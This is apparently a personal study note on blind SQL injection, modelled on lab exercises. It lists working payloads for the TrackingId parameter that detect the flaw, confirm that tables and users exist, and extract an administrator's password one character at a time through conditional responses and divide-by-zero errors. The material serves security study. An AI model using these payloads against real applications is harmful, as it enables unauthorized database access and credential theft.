# SQL Injection

- SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
- Find endpoints for an application where it is likely to interact with DB server such as login, register, forgot password, add record, etc.


## Blind SQL injection

- It occurs when HTTP response of vulnerable request do not contain details of any database errors.
- Attacks of UNION are ineffective as they rely on result of query passed.

Types

1. Conditional responses (TRUE / FALSE):
    - You can retrieve information by triggering different responses conditionally, depending on an injected condition.
        ![image](https://github.com/th3-r3sistanc3/Notes/assets/71440632/6ca4ec03-3f3a-4f9c-a79a-fc92b4e46167)
         
         `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a` -->
         This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is `a`.
  
  - List of payloads
    - To check vulnerable or not
        > TrackingId=xyz' AND '1'='1

    - To check if table name exists
        > TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

    - To check particular username exist in table
        > TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

    - To check length of password (Increase value of `1` with each iteration)
        > TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

    - To check password character wise (Increase value of `1` first one with each iteration)
        > TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

2. Error-based SQL Injection
  - Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts
  - When injecting different boolean conditions makes no difference to the application's responses.
  - Modify the query so that it causes a database error only if the condition is true.
  - Purpose cause error, so if condition is false it will return error for e.g. Divide by zero
  - Payload
      > xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a


